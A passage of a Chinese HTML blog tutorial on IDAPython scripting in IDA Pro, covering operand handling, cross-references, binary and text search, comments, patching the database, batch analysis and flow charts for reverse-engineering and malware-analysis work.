class="string">"bp"</span> <span class="keyword">in</span> idc.print_operand(line,<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> op == <span class="number">1</span>:</span><br><span class="line">                index = (~(int(tmp.Op1.addr) - <span class="number">1</span>) &amp; <span class="number">0xFFFFFFFF</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                index = (~(int(tmp.Op2.addr) - <span class="number">1</span>) &amp; <span class="number">0xFFFFFFFF</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> op ==<span class="number">1</span> :</span><br><span class="line">                index = int(tmp.Op1.addr)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                index = int(tmp.Op2.addr)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> index:</span><br><span class="line">            displace[index].append( hex(line) )</span><br><span class="line">            </span><br><span class="line">print(displace)</span><br></pre></td></tr></table></figure>

<p><code>idaapi.decode_insn(tmp,line)</code>是解析指令的另一种底层的方法，但是 表示偏移的意思。详细可以看<a href="https://www.hex-rays.com/products/ida/support/sdkdoc/classop__t.html#a866a7d0be0dce15c155d93d097ef54b3" target="_blank" rel="noopener">这个文档</a>。</p>
<p>我们已经获取了操作符的字符串表示，那么我们检查操作符中是否包含了“bp”字符串，这是一个快速判断操作符的中寄存器是否为 bp，ebp 或者 rbp 的方法。检查”bp”字符串的目的在于确定偏移量是否是一个负数。我们使用idaapi.cmd.Op1.addr 来获取偏移量，这个方法会返回一个字符串。然后我们把他转换成为一个 integer 类型，如果需要的话把它转换为正数，然后我们把它放进脚本最开始定义的字典 display 中去。这样就完成了我们的操作，之后如果你想要查找使用某个偏移量的所有地址，直接读取就可以了。</p>
<h5 id="例子2"><a href="#例子2" class="headerlink" title="例子2"></a>例子2</h5><p>有时候我们在逆向分析一个可执行文件的内存转储的时候，有些操作数就不是一个偏移量了。看如下代码：</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">push</span> <span class="number">0Ch</span></span><br><span class="line"><span class="keyword">push</span> <span class="number">0BC10B8h</span></span><br><span class="line"><span class="keyword">push</span> [<span class="built_in">esp</span>+<span class="number">10h</span>+arg_0]</span><br><span class="line"><span class="keyword">call</span> <span class="built_in">ds</span>:_strnicmp</span><br></pre></td></tr></table></figure>

<p>第二个被 push 的值是一个存在内存中的偏移。如果我们通过右键把这个偏移定义为data 类型，我们可以看到这个偏移其实是一个字符串，当然完成这个定义操作很简单，但是,有时候这种操作太多了话就需要写一个脚本来自动完成这件事情。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> idc </span><br><span class="line"><span class="keyword">import</span> idautils </span><br><span class="line"><span class="keyword">import</span> idaapi </span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</span><br><span class="line"></span><br><span class="line">min = idc.get_inf_attr(INF_MIN_EA)</span><br><span class="line">max = idc.get_inf_attr(INF_MAX_EA)</span><br><span class="line"><span class="comment"># for each known function</span></span><br><span class="line"><span class="keyword">for</span> func <span class="keyword">in</span> idautils.Functions():</span><br><span class="line">    flags = idc.get_func_attr(func, FUNCATTR_FLAGS)</span><br><span class="line"><span class="comment"># skip library &amp; thunk functions</span></span><br><span class="line">    <span class="keyword">if</span> flags &amp; FUNC_LIB <span class="keyword">or</span> flags &amp; FUNC_THUNK:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    dism_addr = list(idautils.FuncItems(func))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> curr_addr <span class="keyword">in</span> dism_addr:</span><br><span class="line">        <span class="keyword">if</span> idc.get_operand_type(curr_addr, <span class="number">0</span>) == <span class="number">5</span> <span class="keyword">and</span> \</span><br><span class="line">        (min &lt; idc.get_operand_value(curr_addr,<span class="number">0</span>) &lt; max):</span><br><span class="line">            idc.op_plain_offset(curr_addr, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">            <span class="comment"># print(hex(curr_addr))</span></span><br><span class="line">        <span class="keyword">if</span> idc.get_operand_type(curr_addr, <span class="number">1</span>) == <span class="number">5</span> <span class="keyword">and</span> (min &lt; idc.get_operand_value(curr_addr,<span class="number">1</span>) &lt; max):</span><br><span class="line">            idc.op_plain_offset(curr_addr, <span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">            <span class="comment"># print( hex(curr_addr) )</span></span><br></pre></td></tr></table></figure>

<p><code>idc.get_operand_value(ea,n)</code>获取操作数的值。</p>
<p><code>idc.op_plain_offset(ea,n,base)</code>,将操作数转换为一个偏移地址，该函数的第一个参数为地址，第二个参数为操作数的索引，第三个参数是基地址，该例子中只需要设置为0即可。</p>
<h4 id="交叉引用-Xrefs"><a href="#交叉引用-Xrefs" class="headerlink" title="交叉引用(Xrefs)"></a>交叉引用(Xrefs)</h4><p>能够定位data段和code段的交叉引用非常重要，交叉引用的重要性在于它能够提供某个确定的数据或者某个函数被调用的位置。举个栗子，如果我们想要知道哪些地址调用了 WriteFile()函数，我们所要做的就是在导入表中找到 WriteFile()函数，然后查看其交叉引用即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> idc </span><br><span class="line"><span class="keyword">import</span> idautils </span><br><span class="line"><span class="keyword">import</span> idaapi </span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</span><br><span class="line"></span><br><span class="line">addr = idc.get_name_ea_simple(<span class="string">"StartServiceCtrlDispatcherW"</span>)</span><br><span class="line"></span><br><span class="line">print( idc.GetDisasm(addr) )</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> idautils.CodeRefsTo(addr,<span class="number">0</span>):</span><br><span class="line">    print( hex(i),idc.GetDisasm(i) )</span><br></pre></td></tr></table></figure>

<p><code>idc.get_name_ea_simple(&quot;StartServiceCtrlDispatcherW&quot;)</code>来获取API函数的地址，然后使用<code>idautils.CodeRefsTo(ea,flow)</code>来获取该API的所有交叉引用，在函数中，ea 参数是我们想要寻找交叉引用的地址，flow 参数是一个 bool 值，它用于指定是否遵循正常的代码流。</p>
<p>也可以调用 <code>idautils.Names()</code>函数来获取在 IDA 中任何 API 和被重命名的函数的相关信息，该函数将返回一个类型为(ea, str_name)的元组。</p>
<p>我们同样可以利用 idautisl.CodeRefsFrom(ea,flow)该函数来获取任意地址所引用的代码，下面的例子展示获取某地址的引用信息。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Python&gt;addr = here()</span><br><span class="line">Python&gt;idautils.CodeRefsFrom(addr,<span class="number">0</span>)</span><br><span class="line">Python&gt;<span class="keyword">for</span> i <span class="keyword">in</span> idautils.CodeRefsFrom(addr,<span class="number">0</span>):print(hex(i),idc.GetDisasm(i))</span><br><span class="line"><span class="number">0x40a008</span> extrn StartServiceCtrlDispatcherW:dword</span><br></pre></td></tr></table></figure>

<p>但有一点要注意：使用 idautils.CodeRefsTo（ea，flow）的限制是，动态导入并手动重命名的 API 不会<br>显示为代码交叉引用。比如下面我们利用 idc.MakeName(ea, name)将一个 dword 的地址重<br>命名为”RtlCompareMemory”。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&gt;hex(ea)</span><br><span class="line"><span class="number">0xa26c78</span></span><br><span class="line">&gt;set_name(ea, <span class="string">"RtlCompareMemory"</span>, SN_CHECK)</span><br><span class="line"><span class="literal">True</span></span><br><span class="line">&gt;<span class="keyword">for</span> addr <span class="keyword">in</span> idautils.CodeRefsTo(ea,<span class="number">0</span>):print(hex(addr),idc.GetDisasm(addr))</span><br></pre></td></tr></table></figure>

<p>IDA 并不会将这些 API 标记为交叉引用代码。稍后我们将会使用一个通用的技术来获得所有的交叉引用。</p>
<p>如果我们想要查找数据的交叉引用或者调用，我们使用 idautils.DataRefsTo(e) 或者 idautils.DataRefsFrom(ea)。</p>
<p>idautils.DataRefsTo(ea)函数只有一个地址参数，它返回该数据地址的所有交叉引用（迭代器）。</p>
<p>idautils.DataRefsFrom(ea)只携带一个地址作为参数，它返回改、该地址所引用的数据地址。</p>
<p>在查找数据和代码的交叉引用的时候可能会有一些困惑，这里我们使用前面所提到的有一种更加通用的方法来获取交叉引用，该方法调用两个函数就能完成获取所有交叉引用地址和调用地址的效果，这两个函数就是 idautils.XrefsTo(ea, flags=0)和 idautils.XrefsFrom(ea,flags=0)。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> idc </span><br><span class="line"><span class="keyword">import</span> idautils </span><br><span class="line"><span class="keyword">import</span> idaapi </span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</span><br><span class="line"></span><br><span class="line">addr = here()</span><br><span class="line"></span><br><span class="line">print(hex(addr),idc.GetDisasm(addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> xref <span class="keyword">in</span> idautils.XrefsTo(addr,<span class="number">1</span>): </span><br><span class="line">    print(xref.type,idautils.XrefTypeName(xref.type),hex(xref.frm),hex(xref.to),xref.iscode)</span><br></pre></td></tr></table></figure>

<p><code>idautils.XrefsTo(ea,flags=0)</code>ida_xref.XREF_ALL=0 (default), ida_xref.XREF_FAR=1, ida_xref.XREF_DATA=2</p>
<p>xref.type来指明该交叉引用的类型，idautils.XrefTypeName(xref.t ype)用来打印表示该类型的含义，这其中有十二种不同的类型。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>= <span class="string">'Unknown'</span></span><br><span class="line"><span class="number">1</span>= <span class="string">'Offset'</span></span><br><span class="line"><span class="number">2</span>= <span class="string">'Write'</span></span><br><span class="line"><span class="number">3</span>= <span class="string">'Read'</span></span><br><span class="line"><span class="number">4</span>= <span class="string">'Text'</span></span><br><span class="line"><span class="number">5</span> = <span class="string">'Data_Informational'</span></span><br><span class="line"><span class="number">16</span>= <span class="string">'Far_Call'</span></span><br><span class="line"><span class="number">17</span>= <span class="string">'Near_Call'</span></span><br><span class="line"><span class="number">18</span>= <span class="string">'Far_Jump'</span></span><br><span class="line"><span class="number">19</span>= <span class="string">'Near_Jump'</span></span><br><span class="line"><span class="number">20</span>= <span class="string">'Code_User'</span></span><br><span class="line"><span class="number">21</span> = <span class="string">'Ordinary_Flow'</span></span><br></pre></td></tr></table></figure>

<p>xref.frm 打印出该地址的交叉引用，xref.to 打印出改地址本身，xref.iscode 打印出该交叉引用是否在代码段中，上述的代码我们使用了 idautils.XrefsTo(ea, 1)并将其 flag 位设为了1，如果我们将 flag 设为 0 的话，那么它将会显示该地址的任意交叉引用。设置flag为0获取的交叉引用不只是来自于分支跳转指令，同时还会来自正常的指令流程，设置flag为1可以略过正常指令流程造成的交叉引用。</p>
<h4 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h4><p>我们其实已经能够通过遍历所有已知的函数及其指令来达到一种基本的搜索效果，这当然很有用，但是有时候我们需要搜索一些特定的字节，比如说 0x55,0x8b,0xec 这种字节序列，这 3 个字节其实代表的汇编代码为 push ebp, mov ebp, esp。所以我们可以使用<code>idc.find_binary(ea,flag,searchstr,radix=16)</code>来实行字节或者二进制的搜索。ea代表啥就不说了，flag代表搜索方向或者条件。flag有好几种不同的类型：</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">SEARCH_UP</span> = <span class="number">0</span></span><br><span class="line"><span class="attr">SEARCH_DOWN</span> = <span class="number">1</span></span><br><span class="line"><span class="attr">SEARCH_NEXT</span> = <span class="number">2</span></span><br><span class="line"><span class="attr">SEARCH_CASE</span> = <span class="number">4</span></span><br><span class="line"><span class="attr">SEARCH_REGEX</span> = <span class="number">8</span></span><br><span class="line"><span class="attr">SEARCH_NOBRK</span> = <span class="number">16</span></span><br><span class="line"><span class="attr">SEARCH_NOSHOW</span> = <span class="number">32</span></span><br><span class="line"><span class="attr">SEARCH_IDENT</span> = <span class="number">128</span></span><br><span class="line"><span class="attr">SEARCH_BRK</span> = <span class="number">256</span></span><br></pre></td></tr></table></figure>

<p>上面的类型不必要都看一遍，但是还是要看看一些常用的类型：</p>
<ul>
<li>SEARCH_UP 和 SEARCH_DOWN 用来指明搜索的方向</li>
<li>SEARCH_NEXT 用来获取下一个已经找到的对象</li>
<li>SEARCH_CASE 用来指明是否区分大小写</li>
<li>SEARCH_NOSHOW 用来指明是否显示搜索的进度</li>
</ul>
<p>searchstr 是我们要查找的形态，radix 参数在写处理器模块时使用，这超出本书要讲解的范围，所以我推荐你去看一看 Chris Eagle 的“The IDA Pro Book”的第 19 章，所以这里我们把 radix 参数留空。现在让我们来实现刚才提到的那三个字节的搜索好了：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> idc </span><br><span class="line"><span class="keyword">import</span> idautils </span><br><span class="line"><span class="keyword">import</span> idaapi </span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</span><br><span class="line"></span><br><span class="line">pattern = <span class="string">"55 8B EC"</span></span><br><span class="line"></span><br><span class="line">addr = idc.get_inf_attr(INF_MIN_EA)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">5</span>):</span><br><span class="line">    addr = idc.find_binary(addr,SEARCH_DOWN,pattern)</span><br><span class="line">    <span class="keyword">if</span> addr!= idc.BADADDR:</span><br><span class="line">        print(hex(addr),idc.GetDisasm(addr))</span><br></pre></td></tr></table></figure>

<p>第一行我们定义了要搜索的形式，搜索形式可以是 16 进制格式，比如 0x55 0x8B 0xEC和 55 8B EC 都是可以的，\x55\x8B\xEC 这种格式可不行，除非你使用 idc.find_text(ea, flag,y, x, searchstr)这个函数。</p>
<p>但是我们搜索的时候，地址并没有增长，那是因为我们写程序的时候没有增加SEARCH_NEXT这个标记。正确的写法如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> idc </span><br><span class="line"><span class="keyword">import</span> idautils </span><br><span class="line"><span class="keyword">import</span> idaapi </span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</span><br><span class="line"></span><br><span class="line">pattern = <span class="string">"55 8B EC"</span></span><br><span class="line"></span><br><span class="line">addr = idc.get_inf_attr(INF_MIN_EA)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">5</span>):</span><br><span class="line">    addr = idc.find_binary(addr,SEARCH_DOWN|SEARCH_NEXT,pattern)</span><br><span class="line">    <span class="keyword">if</span> addr!= idc.BADADDR:</span><br><span class="line">        print(hex(addr),idc.GetDisasm(addr))</span><br></pre></td></tr></table></figure>

<p>搜索字符串使用函数<code>idc.find_text(ea, flag, y, x, searchstr, from_bc695=False)</code>ea参数是地址，flag参数是搜索方向和搜索类型。y是从ea开始搜索的行数，x 是行中的坐标。这两个参数通常置 0，现在我们开始查找字符串“Accept”的出现的次数。当然你可以换换其他的字符串，可以从字符串窗口（shift+F12）获得。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> idc </span><br><span class="line"><span class="keyword">import</span> idautils </span><br><span class="line"><span class="keyword">import</span> idaapi </span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</span><br><span class="line"></span><br><span class="line">addr = idc.get_inf_attr(INF_MIN_EA)</span><br><span class="line">end = idc.get_inf_attr(INF_MAX_EA)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> addr &lt; end:</span><br><span class="line">    addr = idc.find_text(addr,SEARCH_DOWN,<span class="number">0</span>,<span class="number">0</span>,<span class="string">"accept"</span>)</span><br><span class="line">    <span class="keyword">if</span> addr == idc.BADADDR:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(hex(addr),idc.GetDisasm(addr))</span><br><span class="line">        addr = idc.next_head(addr)</span><br></pre></td></tr></table></figure>

<p>因为我们利用了 idc.NextHead(ea)使当前地址不断增长，所以就不需要在 idc. FindText()中添加 SEARCH_NEXT 的标志。为什么我们要手动的增加地址呢，因为一行字符串中可能出现多次要查找的字符串，往上翻认真阅读 SEARCH_NEXT的标志的意思。</p>
<p>IDApython用如下函数来判断一个地址的类型，这些api返回bool值，true或者false </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">idc.is_code(f) <span class="comment"># 判断是否是代码</span></span><br><span class="line">idc.is_data(f) <span class="comment"># 判断是否是数据</span></span><br><span class="line">idc.is_tail(f) <span class="comment"># 判断 IDA 是否将其判定为尾部。</span></span><br><span class="line">idc.is_unknown(f) <span class="comment"># 判断 IDA 是否将其判定为未知，即既不是数据，也不是代码。</span></span><br><span class="line">idc.is_head(f) <span class="comment"># 判断 IDA 是否将其判定为头部。</span></span><br></pre></td></tr></table></figure>

<p>f 这个参数是新出现的，相比起于传递地址，我们还要先通过 idc.get_full_flags(ea)获取地址的内部标志表示，然后再传给 idc.is 系列函数当参数，代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Python&gt;idc.get_full_flags(here())</span><br><span class="line"><span class="number">0x4001078d</span></span><br><span class="line">Python&gt;idc.is_code( idc.get_full_flags(here()))</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure>

<p><code>idc.find_code(ea,flag)</code>该函数用来寻找被标志为代码的下一个地址。这对我们想要查找数据块的末尾是很有帮助的。如果 ea 是代码地址，那么该函数返回下一个代码地址，flag 参数看前面的 idc.find_text就可以了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Python&gt;addr = idc.find_code(addr,SEARCH_DOWN|SEARCH_NEXT)</span><br><span class="line">Python&gt;print(hex(addr),idc.GetDisasm(addr))</span><br><span class="line"><span class="number">0x404d70</span> lea     ecx, [esp+<span class="number">668</span>h+phkResult]</span><br></pre></td></tr></table></figure>

<p>这个函数会跳过一些数据段的地址，得到最近的一个代码端的首地址。</p>
<p><code>idc.find_data(ea,flag)</code>和上面的<code>find_code</code>函数差不多，不过它返回的是数据段的地址。</p>
<p><code>idc.find_unknown(ea,flag)</code>该功能用于查找 IDA 未识别为代码或数据的字节地址。未知类型需要通过观察或脚本进一步手动分析。</p>
<p><code>idc.find_defined(ea, flag)</code>它用于查找 IDA 标识为代码或数据的地址。</p>
<p><code>idc.find_imm(ea, flag, value)</code>用来寻找立即数。例如：相比于寻找一些类型，我们有些时候其实更希望能够找到特定的值，举个栗子，你感觉代码里面肯定是用了 rand()函数来产生随机数的，但是你就是找不到它，咋办？如果我们知道这个 rand()函数采用了 0x343fd 作为种子那么我们就可以去寻找这个数值：</p>
<p>idc.imm函数返回一个元组，元组的第一项为地址，第二项为标识是第几个操作数。这里操作数的算法和 idc.print_operand一样，也是从 0 开始的。循环使用搜索需要添加SEARCH_ DOWN|SEARCH_NEXT 标志。</p>
<h4 id="数据提取"><a href="#数据提取" class="headerlink" title="数据提取"></a>数据提取</h4><p>ida可以获取到用户使用鼠标选中高亮的部分的代码，可以使用如下两个函数获取到选中部分的起始地址。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Python&gt;idc.read_selection_start()</span><br><span class="line"><span class="number">0x404cdb</span></span><br><span class="line">Python&gt;idc.read_selection_end()</span><br><span class="line"><span class="number">0x404d70</span></span><br></pre></td></tr></table></figure>

<p>注意<code>idc.read_selection_end()</code>获取的的并不是这一段代码的末尾地址，选中部分的最后一条指令的下一条指令的起始地址。</p>
<p>函数<code>idaapi.read_selection()</code>也可以实现上面的效果：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p0 = idaapi.twinpos_t()</span><br><span class="line">p1 = idaapi.twinpos_t()</span><br><span class="line">view = idaapi.get_current_viewer()</span><br><span class="line">idaapi.read_selection(view, p0, p1)</span><br></pre></td></tr></table></figure>

<h4 id="注释和重命名"><a href="#注释和重命名" class="headerlink" title="注释和重命名"></a>注释和重命名</h4><p>注释一共有两种，第一种是常规注释，第二种是重复性注释。重复性注释会因为某些地址引用了当前地址的内容，而会自动添加上注释。</p>
<p>使用注释<code>idc.set_cmt(ea, cmt, 0)</code>来增加注释，使用<code>idc.set_cmt(ea, cmt, 1)</code>来增加重复性地址。</p>
<p>ea是要添加注释的地址，cmt是要添加的注释。</p>
<p><code>idc.get_cmt(ea, 0)</code>获取常规注释，<code>idc.get_cmt(ea, 1)</code>获取重复性注释。</p>
<p>当然不止指令可以添加注释，函数也可以添加注释，利用<code>idc.set_func_cmt(ea, cmt, repeatable)</code>来添加注释，利用<code>idc.get_func_cmt(ea, repeatable)</code>来获取函数的注释。ea可以是函数中的任何地址，cmt就是我们需要添加的注释，repeatable 同上面一样。将函数的注释标记为可重复性的话，那么它会在任何调用该函数的地方增加注释。</p>
<p>重命名函数和地址是一项非常常见的自动化任务，特别是在一些地址无关的代码(PIC),加壳或者封装函数中，因为在 PIC 代码和脱壳代码中，导入表可能并不存在于转储中。而封装函数的功能只是简单的调用 API 而已。</p>
<p><code>idc.set_name(ea, name, SN_CHECK)</code>用来重命名某个地址的函数。</p>
<p>值得注意的是 rename_wrapper 中的 idc.MakeNameEx(ea,name, flag)用法，因为使用 idc.MakeName 的话，如果某一个函数名称已经被使用了，那么ida 会抛出一个警告的对话。为了跳过该对话框，我们将 flag 的值设置为 256 或者SN_NOWARN 即可。我们可以应用一些逻辑来将函数重命名为 w_HeapFree_1 等，但为简洁起见，我们会将其忽略。</p>
<h4 id="访问原始数据"><a href="#访问原始数据" class="headerlink" title="访问原始数据"></a>访问原始数据</h4><p>在逆向工程中获取原始数据是非常重要的，原始数据是16进制的字节，它们被解释为数据或代码，ida中我们可以在反汇编代码窗口的左侧看到这些原始数据。（IDA中显示的设置方法： 菜单栏–&gt;选项–&gt;常规–&gt;反汇编–&gt;机器码字节数，填入一个数就ok了–&gt;确定 ）</p>
<p>要获取原始数据的话我们首先要指定获取的单元大小，这些获取原始数据 API 的命名规则就是以单元大小。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">idc.get_wide_byte(ea) // 获取单字节</span><br><span class="line">idc.get_wide_word(ea) // 获取一个字</span><br><span class="line">idc.get_wide_dword(ea) // 获取双字</span><br><span class="line">idc.get_qword(ea) // 获取四字</span><br><span class="line">idc.GetFloat(ea) </span><br><span class="line">idc.GetDouble(ea)</span><br></pre></td></tr></table></figure>

<p>在编写解码脚本是获取单个字节或者单个字并没有太多卵用，所以我们可以使用<br>idc.get_bytes(ea, size, use_dbg = False)来获取某个地址开始的更多的字节。最后一个参<br>数是可选的，用来指定是否正在调试内存。</p>
<p><code>idc.get_bytes</code>返回的是bytes类型，跟<code>idc.get_wide_byte(ea)</code>返回的整型有区别。</p>
<h4 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h4><p>有时候我们在逆向一个恶意软件的时候，样本会有被加密的字符串。这会阻碍我们分析的过程和组织我们通过字符串来定位关键点。这种情况下给 idb 文件打补丁就很有用了。重命名地址但是好像并没有卵用，因为命名是有约束限制的，所以我们需要给某些地址做patch了，我们可以使用如下的函数来 patch：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">patch_byte(ea, value)</span><br><span class="line">patch_word(ea, value)</span><br><span class="line">patch_dword(ea, value)</span><br><span class="line">patch_qword(ea, value)</span><br></pre></td></tr></table></figure>

<p>ea 是地址，value 是值，注意值要和你选择的函数相对应即可。</p>
<h4 id="输入和输出"><a href="#输入和输出" class="headerlink" title="输入和输出"></a>输入和输出</h4><p>在 IDAPython 中当我们并不知道文件的位置或者并不知道用户想要把他们的数据存储在什么地方，输入输出文件就很重要了。导入导出文件我们可以使用 ida_kernwin.ask_file(for_saving, mask, prompt)这个函数，当 forsave 参数为 0，打开一个文件对话框，当 forsave 的参数为 1，打开一个文件保存对话框，mask 用来指定文件后缀或者模式，比如我只想打开.dll 文件的话就可已使用“*.dll”作为 mask 的参数，prompt 是窗口的名称。</p>
<h4 id="批生成文件"><a href="#批生成文件" class="headerlink" title="批生成文件"></a>批生成文件</h4><p>有时，为目录中的所有文件创建 IDB 或 ASM 可能很有用。 在分析属于同一系列恶意软件的一组样本时，这可以帮助节省时间。比起手工做这件事情，写一个批处理文件会容易许多，我们只需要将-B 该参数传给 idaw.exe 即可，下面的代码可以被复制到包含我们想为其生成文件的所有文件的目录中。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> idc </span><br><span class="line"><span class="keyword">import</span> idautils </span><br><span class="line"><span class="keyword">import</span> idaapi </span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> glob</span><br><span class="line">paths = glob.glob(<span class="string">"*"</span>)</span><br><span class="line">ida_path = os.path.join(os.environ[<span class="string">'PROGRAMFILES'</span>], <span class="string">"IDA"</span>,<span class="string">"idaw.exe"</span>)</span><br><span class="line"><span class="keyword">for</span> file_path <span class="keyword">in</span> paths:</span><br><span class="line">    <span class="keyword">if</span> file_path.endswith(<span class="string">".py"</span>):</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">        subprocess.call([ida_path, <span class="string">"-B"</span>, file_path])</span><br></pre></td></tr></table></figure>

<p>脚本运行完成后，会在当前目录下生成ASM文件和IDB文件。</p>
<h4 id="可执行脚本"><a href="#可执行脚本" class="headerlink" title="可执行脚本"></a>可执行脚本</h4><p>ipapython脚本可以在命令行中执行，我们也可以使用下面计算 IDB 拥有指令个数的脚<br>本，然后将其个数写进一个叫做“instru_count.txt”文件中。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> idc </span><br><span class="line"><span class="keyword">import</span> idautils </span><br><span class="line"><span class="keyword">import</span> idaapi </span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</span><br><span class="line"></span><br><span class="line">idaapi.auto_wait()</span><br><span class="line"></span><br><span class="line">count = <span class="number">0</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> func <span class="keyword">in</span> idautils.Functions():</span><br><span class="line">    flags = idc.get_func_attr(func, FUNCATTR_FLAGS)</span><br><span class="line">    <span class="keyword">if</span> flags &amp; idc.FUNC_LIB:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">for</span> instru <span class="keyword">in</span> idautils.FuncItems(func):</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">f = open(<span class="string">"instru_count.t"</span>,<span class="string">'w'</span>) </span><br><span class="line"></span><br><span class="line">writeContent = <span class="string">"Instruction count is &#123;&#125;"</span>.format(count)</span><br><span class="line"></span><br><span class="line">print(writeContent)</span><br><span class="line"></span><br><span class="line">f.write(writeContent)</span><br><span class="line">f.close()</span><br><span class="line">idc.qexit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>上面两个十分重要的函数，一个是<code>idaapi.auto_wait()</code>,一个是<code>idc.qexit(0)</code>,当ida打开一个文件的时候，等待IDA分析完成是很重要的，因为 IDA 分析一个文件需要花大量的时间。这时候你不能执行 IDAPython 脚本，所以你可使用<code>idaapi.auto_wait()</code>来等待IDA文件分析结束，它会在 IDA 分析完成之前一直等待，一旦分析完成，控制权就会交到脚本身上。然后我们同样需要使用 idc.qexit(0)来结束脚本的执行，如果不这么做的话，IDB 可以会在关闭的时候出问题。</p>
<p>如果我们想要计算IDB包含的多少行的话，我们可以使用以下的指令完成。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">idat.exe -A   -S<span class="string">"test.py"</span>  .\Trojan.Win32.AntiAV.aaa.json.idb</span><br></pre></td></tr></table></figure>

<p>-A表示自动化分析，-S表示idb被打开之后立即执行的脚本。</p>
<p>同时自动化脚本也是支持参数的：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">idat.exe -A   -S<span class="string">"test.py test"</span>  .\Trojan.Win32.AntiAV.aaa.json.idb</span><br></pre></td></tr></table></figure>

<p>就能够向脚本中传参数test，可以使用<code>idc.ARGV</code>获取。</p>
<h4 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h4><p>使用ida python生成CFG图。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> idc </span><br><span class="line"><span class="keyword">import</span> idautils </span><br><span class="line"><span class="keyword">import</span> idaapi </span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cls_main</span><span class="params">(p=True)</span>:</span></span><br><span class="line">    f = idaapi.FlowChart(idaapi.get_func(here()))</span><br><span class="line">    <span class="keyword">for</span> block <span class="keyword">in</span> f:</span><br><span class="line">        <span class="keyword">if</span> p:</span><br><span class="line">            print(<span class="string">"%x - %x [%d]:"</span> % (block.start_ea, block.end_ea, block.id))</span><br><span class="line">        <span class="keyword">for</span> succ_block <span 